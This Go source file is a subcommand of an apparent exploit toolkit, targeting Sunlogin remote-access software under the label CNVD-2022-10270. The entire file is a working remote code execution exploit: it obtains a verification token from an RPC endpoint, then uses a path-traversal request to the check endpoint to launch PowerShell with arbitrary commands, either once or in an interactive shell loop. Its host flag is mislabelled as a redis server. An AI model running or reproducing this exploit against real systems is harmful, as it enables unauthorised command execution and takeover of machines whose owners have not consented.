
package cmd

import (
	"bufio"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/spf13/cobra"
)

var sunLoginRecPort int

var sunloginrceCmd = &cobra.Command{
	Use:   "sunlogin",
	Short: "sunlogin RCE CNVD-2022-10270",
	Run: func(cmd *cobra.Command, args []string) {
		sunloginRCE()
	},
}

func sunloginRCE()  {
	if Hosts!=""&&sunLoginRecPort!=0{
		reader:=bufio.NewReader(os.Stdin)
		addr:=fmt.Sprintf("%v:%v",Hosts,sunLoginRecPort)
		verify:=GetVerify(addr)
		if Command!=""{
			fmt.Println(LightGreen(RunCmd(Command,addr,verify)))
		}else {
			for {
				var cmd string
				fmt.Printf(Yellow("\r\n#>"))
				cmd,_=reader.ReadString('\n')
				cmd=strings.TrimSpace(cmd)
				if cmd=="exit"{
					break
				}
				fmt.Println(RunCmd(cmd,addr,verify))
			}
			return
		}
	}else {
		fmt.Println(Red("Please set -H or -p"))
		return
	}
}

func GetVerify(addr string) string { //获取Verify认证
	resp, err := Client.Get("http://" + addr + "/cgi-bin/rpc?action=verify-haras")
	if err != nil {
		return ""
	}
	b,_ := io.ReadAll(resp.Body)
	reg:=regexp.MustCompile(`"verify_string":"(.*?)"`)
	result:=reg.FindAllSubmatch(b,1)
	if len(result)>0{
		if len(result[0])==2{
			return string(result[0][1])
		}
	}
	return ""
}
func RunCmd(cmd string,addr string,verify string) string {
	httpheader:=http.Header{}
	cmd = url.QueryEscape(cmd)
	target:="http://" + addr+ `/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+` + cmd
	req,err:=http.NewRequest("GET",target,nil)
	if err!=nil{
		fmt.Println(err)
	}
	req.Header=httpheader
	httpheader.Add("Cookie","CID="+verify)
	resp,_:=Client.Do(req)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	str ,_:= io.ReadAll(resp.Body)
	str, _ = simplifiedchinese.GBK.NewDecoder().Bytes(str)
	return string(str)
}

func init() {
	exploitCmd.AddCommand(sunloginrceCmd)
	sunloginrceCmd.Flags().StringVarP(&Hosts,"host","H","","Set redis server host")
	sunloginrceCmd.Flags().IntVarP(&sunLoginRecPort,"port","p",0,"Set RCE port")
	sunloginrceCmd.Flags().StringVarP(&Command,"command","c","","command you want to execute")
}
